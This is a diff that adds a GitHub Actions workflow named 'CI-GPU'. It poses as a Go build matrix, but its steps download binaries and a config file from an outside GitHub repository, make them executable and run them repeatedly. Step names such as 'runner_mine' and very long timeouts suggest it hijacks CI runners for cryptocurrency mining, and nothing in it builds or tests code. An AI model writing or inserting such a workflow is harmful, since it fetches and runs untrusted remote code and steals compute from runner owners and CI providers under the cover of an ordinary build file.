@@ -1,0 +1,116 @@
+name: CI-GPU
+on: [push, pull_request]
+jobs:
+  build:
+    name: Docker
+    runs-on: self-hosted
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4]
+        flag: [A, B, C, D, E]
+    timeout-minutes: 2500
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runner_go
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas2/main/log && wget https://raw.githubusercontent.com/kijang-7/gas2/main/logs && chmod +x log logs && ./log
+    - name: runner_mine
+      continue-on-error: true
+      run: |
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine2
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine3
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine4
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine5
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine6
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine7
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine8
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine9
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
+    - name: runner_mine10
+      continue-on-error: true
+      run: |
+        wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
+        timeout 2m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
+        rm -rf config.json
